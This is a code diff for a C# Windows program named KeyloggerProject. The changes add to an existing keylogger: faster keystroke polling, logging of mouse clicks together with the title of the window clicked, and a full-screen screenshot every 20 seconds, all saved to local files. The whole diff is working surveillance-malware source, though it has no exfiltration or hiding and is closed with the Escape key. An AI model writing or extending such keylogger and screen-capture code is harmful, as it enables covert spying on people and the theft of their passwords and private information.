@@ -5,6 +5,7 @@ namespace KeyloggerProject
     using System;
     using System.IO;
     using System.Runtime.InteropServices;
+    using System.Text;
     using System.Windows.Forms;
 
     public enum MouseButton
@@ -17,10 +18,15 @@ namespace KeyloggerProject
     {
         private DateTime lastMouseMoveTime = DateTime.MinValue;
         private POINT lastMousePos;
+        private DateTime lastScreenshotTime = DateTime.MinValue;
+        private int screenshotIntervalSeconds = 20;
         private string currentText = "";
+        private bool isClosing = false;
         private Dictionary<Keys, DateTime> keyLastPressed = new Dictionary<Keys, DateTime>();
         private Dictionary<MouseButton, DateTime> mouseLastPressed = new Dictionary<MouseButton, DateTime>();
+        private DateTime lastWindowClickTime = DateTime.MinValue;
         private int keyRepeatDelayMs = 150;
+        private int windowClickDelayMs = 500;
 
 
         [StructLayout(LayoutKind.Sequential)]
@@ -33,7 +39,7 @@ namespace KeyloggerProject
         [DllImport("user32.dll")]
         public static extern bool GetCursorPos(out POINT lpPoint);
 
-    
+
 
 
         [DllImport("User32.dll")]
@@ -41,6 +47,13 @@ namespace KeyloggerProject
 
         Timer timer;
         StreamWriter sw;
+
+        [DllImport("user32.dll")]
+        public static extern IntPtr WindowFromPoint(Point p);
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        public static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);
+
 
 
 
@@ -54,27 +67,54 @@ namespace KeyloggerProject
 
 
             timer = new Timer();
-            timer.Interval = 30;
+            timer.Interval = 10;
             timer.Tick += Timer_Tick;
             timer.Start();
 
             sw = new StreamWriter("keylog.txt", false);
         }
-
-
-
         private void CheckMouseClick(MouseButton button, int keyCode, DateTime now)
         {
+            // Check if the mouse button is currently pressed
             if ((GetAsyncKeyState(keyCode) & 0x8000) != 0)
             {
+                // Enforce a delay between clicks to avoid duplicate logging
                 if (!mouseLastPressed.ContainsKey(button) || (now - mouseLastPressed[button]).TotalMilliseconds >= keyRepeatDelayMs)
                 {
                     mouseLastPressed[button] = now;
-                    sw.Write(Environment.NewLine+$"{button} mouse button clicked at {now}{Environment.NewLine}");
+
+                    // If the program is closing or the writer is unavailable, stop here
+                    if (isClosing || sw == null) return;
+
+                    // Log the button click with timestamp
+                    sw.Write(Environment.NewLine + $"{button} mouse button clicked at {now}{Environment.NewLine}");
+
+                    // If the button is the left mouse button, identify the window under the cursor
+                    if (button == MouseButton.Left)
+                    {
+                        POINT pt;
+                        if (GetCursorPos(out pt))
+                        {
+                            IntPtr hWnd = WindowFromPoint(new Point(pt.X, pt.Y));
+                            StringBuilder windowText = new StringBuilder(256);
+                            GetWindowText(hWnd, windowText, 256);
+
+                            // Log the window title if enough time has passed since the last log
+                            if (!string.IsNullOrWhiteSpace(windowText.ToString()) &&
+                                (now - lastWindowClickTime).TotalMilliseconds >= windowClickDelayMs)
+                            {
+                                sw.Write($"Clicked on: {windowText}{Environment.NewLine}");
+                                lastWindowClickTime = now;
+                            }
+                        }
+                    }
+
+                    // Flush the stream to ensure everything is written immediately
                     sw.Flush();
                 }
             }
         }
+
         private void CheckMouseClicks()
         {
             DateTime now = DateTime.Now;
@@ -131,41 +171,24 @@ namespace KeyloggerProject
 
 
                         }
-                        sw.Write(currentText) ;
+                        sw.Write(currentText);
                         sw.Flush();
                         currentText = "";
                     }
                 }
             }
             CheckMouseClicks();
-
-
-            POINT cursorPos;
-            if (GetCursorPos(out cursorPos))
+            if ((DateTime.Now - lastScreenshotTime).TotalSeconds >= screenshotIntervalSeconds)
             {
-                DateTime mow = DateTime.Now;
-                if ((now - lastMouseMoveTime).TotalMilliseconds >= keyRepeatDelayMs)
-                {
-                    if (cursorPos.X != lastMousePos.X || cursorPos.Y != lastMousePos.Y)
-                    {
-                        
-                            string mouseMoveLog = Environment.NewLine + $"Mouse moved to: ({cursorPos.X}, {cursorPos.Y}){Environment.NewLine}";
-                            sw.Write(mouseMoveLog);
-                            sw.Flush();
-                            lastMouseMoveTime = now;
-                            lastMousePos = cursorPos;
-                        }
-                    
-                }
+                TakeScreenshot();
+                lastScreenshotTime = DateTime.Now;
             }
             if ((GetAsyncKeyState((int)Keys.Escape) & 0x8000) != 0)
             {
+                isClosing = true;
                 this.Close();
                 return;
             }
-
-
-
         }
 
         private string GetShiftSymbol(Keys key)
@@ -205,14 +228,36 @@ namespace KeyloggerProject
             return "";
 
         }
-
-
-
-
         protected override void OnFormClosed(FormClosedEventArgs e)
         {
             sw.Close();
             base.OnFormClosed(e);
         }
+    
+    private void TakeScreenshot()
+        {
+            try
+            {
+                Rectangle bounds = Screen.PrimaryScreen.Bounds;
+                using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
+                {
+                    using (Graphics g = Graphics.FromImage(bitmap))
+                    {
+                        g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
+                    }
+
+                    string filename = $"screenshot_{DateTime.Now:yyyyMMdd_HHmmss}.png";
+                    bitmap.Save(filename);
+                    sw.Write($"Screenshot taken: {filename}{Environment.NewLine}");
+                    sw.Flush();
+                }
+            }
+            catch (Exception ex)
+            {
+                sw.Write($"Error taking screenshot: {ex.Message}{Environment.NewLine}");
+                sw.Flush();
+            }
+        }
+
     }
 }
